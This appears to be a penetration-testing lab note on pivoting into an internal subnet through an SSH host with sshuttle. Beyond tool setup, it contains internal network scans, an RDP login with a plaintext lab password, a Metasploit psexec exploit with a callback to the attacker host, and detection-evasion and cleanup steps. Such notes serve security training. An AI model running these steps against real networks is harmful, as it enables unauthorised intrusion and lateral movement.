# SSH Pivoting with Sshuttle

**Back to:** [[Pivoting, Tunneling and Port Forwarding|Pivoting Index]]
**Related:** [[SSH Socks Tunnel PF|SSH Dynamic SOCKS]], [[Remote-Reverse Port Forwarding with SSH|SSH Reverse Forward]]

---

## Overview

Sshuttle is a transparent proxy tool that creates a VPN-like connection over SSH. It automatically handles routing without requiring proxychains, making it the easiest SSH pivoting method.

**Key Features:**
- Transparent proxying (no proxychains needed)
- Automatic iptables configuration
- VPN-like experience
- DNS forwarding
- Multiple subnet support

**Use Cases:**
- Need transparent network access
- Don't want to use proxychains
- Want VPN-like functionality
- Multiple internal networks to access
- Seamless tool integration

**Advantages:**
- No proxychains configuration
- Works with ALL tools automatically
- Faster than SOCKS proxy
- DNS requests forwarded
- Simple syntax

**Requirements:**
- SSH access to pivot
- Python on pivot host
- Root/sudo on attack machine (for iptables)

---

## Installation

### Attack Machine
```bash
# Debian/Ubuntu
sudo apt-get install sshuttle

# RHEL/CentOS
sudo yum install sshuttle

# Arch Linux
sudo pacman -S sshuttle

# From source
git clone https://github.com/sshuttle/sshuttle.git
cd sshuttle
sudo ./setup.py install

# Via pip
pip install sshuttle
```

### Verify Installation
```bash
sshuttle --version
# Output: sshuttle 1.1.1
```

---

## Network Topology

```
Attack Machine → SSH → Pivot Host → Internal Network
(10.10.14.18)         (10.129.202.64)  (172.16.5.0/23)
   Transparent                           Auto-routed
```

### Environment Details

| Component | IP Address | Description |
|-----------|------------|-------------|
| Attack Machine | 10.10.14.18 | Runs sshuttle |
| Pivot Host | 10.129.202.64 | SSH server (Ubuntu) |
| Internal Network | 172.16.5.0/23 | Target subnet |
| Windows Target | 172.16.5.19 | RDP server example |

---

## Basic Usage

### Single Subnet Pivoting

```bash
# Route single subnet through pivot
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

**Parameters:**
- `-r ubuntu@10.129.202.64`: SSH to pivot host
- `172.16.5.0/23`: Subnet to route
- `-v`: Verbose output

**What Happens:**
1. Connects via SSH to pivot
2. Creates iptables NAT rules
3. Starts transparent proxy on localhost:12300
4. Routes specified subnet through tunnel

**Output:**
```
Starting sshuttle proxy.
c : Connected to server.
fw: Starting firewall with Python version 3.9.2
fw: ready method name nat.
```

---

### Access Internal Network

Now ALL tools work without proxychains!

```bash
# Nmap scan (no proxychains!)
nmap -sV -p3389 172.16.5.19 -Pn

# RDP connection (no proxychains!)
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

# SMB enumeration (no proxychains!)
smbclient -L //172.16.5.19 -U username

# SSH to internal host (no proxychains!)
ssh user@172.16.5.30

# Web browsing (no proxychains!)
curl http://172.16.5.20
firefox http://172.16.5.20
```

---

## Advanced Usage

### Multiple Subnets

```bash
# Route multiple subnets
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 10.10.10.0/24 -v
```

### Exclude Specific IPs

```bash
# Route subnet but exclude specific IPs
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -x 172.16.5.5 -x 172.16.5.10
```

**Use Case:** Exclude pivot host itself or problematic hosts

### DNS Forwarding

```bash
# Forward DNS queries through tunnel
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --dns -v
```

**Benefit:** Resolve internal hostnames

### Route All Traffic (Full VPN)

```bash
# Route ALL internet traffic through pivot
sudo sshuttle -r ubuntu@10.129.202.64 0.0.0.0/0 -v

# Exclude local network
sudo sshuttle -r ubuntu@10.129.202.64 0.0.0.0/0 -x 10.10.14.0/24 -v
```

---

## Authentication Methods

### Password Authentication

```bash
# Interactive password prompt (default)
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23

# Password from environment
export SSHPASS='password'
sudo -E sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23
```

### SSH Key Authentication

```bash
# Use SSH key
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -e "ssh -i /home/user/.ssh/id_rsa"

# Or configure ~/.ssh/config
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23
```

### SSH Config File

Edit `~/.ssh/config`:
```
Host pivot
    HostName 10.129.202.64
    User ubuntu
    IdentityFile ~/.ssh/id_rsa
    ServerAliveInterval 60
```

Then use:
```bash
sudo sshuttle -r pivot 172.16.5.0/23
```

---

## Advanced Features

### Auto-hosts File

```bash
# Automatically add hostnames to /etc/hosts
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --auto-hosts
```

### Daemon Mode

```bash
# Run in background
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -D

# Check if running
ps aux | grep sshuttle

# Kill daemon
sudo pkill sshuttle
```

### Seed Hosts

```bash
# Pre-populate host routes
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --seed-hosts 172.16.5.19,172.16.5.20
```

### Method Selection

```bash
# NAT method (default, most compatible)
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --method nat

# TPROXY method (requires kernel support)
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --method tproxy

# PF method (for BSD/macOS)
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --method pf
```

### Custom Port

```bash
# SSH on non-standard port
sudo sshuttle -r ubuntu@10.129.202.64:2222 172.16.5.0/23
```

---

## Practical Examples

### Example 1: Full Network Enumeration

```bash
# Start sshuttle
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --dns -v

# Ping sweep (new terminal)
nmap -sn 172.16.5.0/23

# Port scan discovered hosts
nmap -sV -p- 172.16.5.19 -Pn

# Service enumeration
nmap -sC -sV -p80,443,445,3389 172.16.5.19
```

### Example 2: Multiple Networks

```bash
# Route multiple internal networks
sudo sshuttle -r ubuntu@10.129.202.64 \
  172.16.5.0/23 \
  10.10.10.0/24 \
  192.168.1.0/24 \
  --dns -v
```

### Example 3: Metasploit Through Sshuttle

```bash
# Start sshuttle
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

# Use Metasploit normally (no proxychains!)
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 172.16.5.0/24
run

# Exploit internal target
use exploit/windows/smb/psexec
set RHOSTS 172.16.5.19
set LHOST 10.10.14.18
exploit
```

---

## Troubleshooting

### Cannot Connect

```bash
# Test SSH connectivity first
ssh ubuntu@10.129.202.64

# Verbose output for debugging
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -vvv
```

### Permission Denied

```bash
# Ensure sudo/root access
sudo which sshuttle

# Check iptables permissions
sudo iptables -L -n
```

### Python Not Found on Pivot

```bash
# Sshuttle needs Python on pivot
ssh ubuntu@10.129.202.64 python3 --version

# Install if missing
ssh ubuntu@10.129.202.64 "sudo apt-get install python3"
```

### Routes Not Working

```bash
# Check iptables rules
sudo iptables -t nat -L -n -v

# Verify routing table
ip route show

# Check for conflicts
sudo sshuttle --firewall
```

### DNS Not Resolving

```bash
# Force DNS forwarding
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --dns

# Check /etc/resolv.conf
cat /etc/resolv.conf
```

### Connection Drops

```bash
# Add keepalive
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 \
  -e "ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3"

# Use auto-reconnect (in script)
while true; do
    sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
    sleep 5
done
```

---

## Comparison with Other SSH Methods

| Feature | Sshuttle | [[SSH Socks Tunnel PF\|SSH Dynamic]] | [[Remote-Reverse Port Forwarding with SSH\|SSH Reverse]] |
|---------|----------|------------|-------------|
| Proxychains Needed | No | Yes | N/A |
| Transparent Routing | Yes | No | No |
| DNS Forwarding | Yes | Manual | N/A |
| Root Required | Yes | No | No |
| Ease of Use | Easiest | Easy | Medium |
| Performance | Fast | Medium | Fast |
| All Tools Work | Yes | Yes (with proxychains) | Specific ports |

**Use Sshuttle When:**
- Want transparent VPN-like access
- Don't want proxychains overhead
- Need DNS forwarding
- Have root/sudo on attack machine
- Want simple, clean syntax

**Use SSH Dynamic SOCKS When:**
- Don't have root access
- Proxychains is acceptable
- Want more control over routing

**Use SSH Reverse Forward When:**
- Need specific port forwarding
- Catching reverse shells
- One-way traffic needed

---

## Operational Security

### Detection Indicators
- Long-duration SSH connection
- High data transfer over SSH
- Modified iptables rules
- Python process on pivot
- sshuttle process on attack machine

### Evasion Techniques

```bash
# Use common SSH port
ssh -p 443 ubuntu@10.129.202.64

# Compress traffic
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 \
  -e "ssh -C"

# Limit bandwidth
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 \
  -e "ssh -o \"ControlMaster=auto\""

# Clean up after
sudo pkill sshuttle
sudo iptables -t nat -F
```

---

## Quick Reference

```bash
# Basic tunnel
sudo sshuttle -r user@pivot SUBNET

# Single subnet
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23

# Multiple subnets
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 10.10.10.0/24

# With DNS
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 --dns

# Verbose
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

# Exclude IPs
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -x 172.16.5.5

# All traffic (VPN mode)
sudo sshuttle -r ubuntu@10.129.202.64 0.0.0.0/0

# With SSH key
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -e "ssh -i key.pem"

# Background daemon
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -D

# Kill sshuttle
sudo pkill sshuttle

# Clean iptables
sudo iptables -t nat -F
```

---

## Integration with Other Tools

### With Nmap
```bash
# No special configuration needed!
nmap -sV -p- 172.16.5.19 -Pn
```

### With Metasploit
```bash
# Works directly
msfconsole
set RHOSTS 172.16.5.19
exploit
```

### With Browser
```bash
# Direct access
firefox http://172.16.5.20
```

### With SMB Tools
```bash
# No proxychains needed
smbclient -L //172.16.5.19
enum4linux 172.16.5.19
```

---

**See Also:**
- [[Pivoting, Tunneling and Port Forwarding|Main Pivoting Index]]
- [[SSH Socks Tunnel PF|SSH Dynamic SOCKS Tunnel]]
- [[Remote-Reverse Port Forwarding with SSH|SSH Reverse Port Forwarding]]
- [[SOCKS5 Tunneling with Chisel|Chisel SOCKS5 Tunneling]]

**Tags:** #sshuttle #ssh #transparent-proxy #vpn #pivoting #no-proxychains #easy-pivoting